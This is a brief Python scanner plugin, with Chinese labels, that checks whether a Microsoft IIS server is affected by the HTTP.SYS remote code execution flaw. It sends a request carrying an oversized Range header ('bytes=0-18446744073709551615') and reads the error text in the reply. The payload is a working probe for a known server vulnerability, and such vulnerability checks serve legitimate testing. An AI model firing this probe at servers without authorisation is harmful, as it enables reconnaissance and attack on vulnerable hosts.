#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: HTTP.SYS远程代码执行
referer: 无
author: qianxiao996
description: HTTP.SYS远程代码执行
'''
import sys
import requests
import warnings
def run(url):
        result =['','不存在']
        try:
            req = requests.get(str(url))
            remote_server = req.headers['server']
            if 'Microsoft-IIS' in remote_server:
                headers = {'Host': 'stuff','Range': 'bytes=0-18446744073709551615'}
                req = requests.get(str(url), headers = headers)
                if 'Requested Range Not Satisfiable' in req.content:
                    result[1]=  '存在'
            
                elif 'The request has an invalid header name' in req.content:
                    result[1]=  '不存在'
                else:
                    result[1]=  '不存在'
            else:
                result[1]=  '不存在'
            # print(result)
        except:
            result[1]=  '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    